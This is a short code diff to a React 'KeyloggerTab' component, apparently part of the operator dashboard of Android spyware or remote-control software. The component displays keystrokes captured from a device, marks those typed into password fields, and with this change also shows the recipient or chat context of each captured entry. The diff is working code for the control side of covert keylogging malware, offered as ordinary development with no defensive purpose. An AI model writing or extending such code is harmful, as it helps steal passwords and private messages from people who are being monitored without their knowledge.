@@ -197,6 +197,9 @@ export default function KeyloggerTab({ device, sendCommand, results, keylogPushE
                 </div>
                 <div className="kl-entry-body">
                   <span className="kl-app-name">{(entry.appName || entry.packageName || '').split('.').pop()}</span>
+                  {entry.screenTitle && (
+                    <span title="Recipient / chat context" style={{ fontSize: 11, background: '#3b82f622', color: '#60a5fa', border: '1px solid #3b82f666', borderRadius: 4, padding: '1px 6px', marginRight: 4, fontWeight: 600 }}>→ {entry.screenTitle}</span>
+                  )}
                   {(entry.isPassword === true || entry.isPassword === 'true' || entry.eventType === 'PASSWORD_FOCUS') && (
                     <span title={entry.fieldType || 'password field'} style={{ fontSize: 11, background: '#ef444422', color: '#ef4444', border: '1px solid #ef444466', borderRadius: 4, padding: '1px 5px', marginRight: 4, fontWeight: 700, letterSpacing: 0.5 }}>🔑 PWD</span>
                   )}
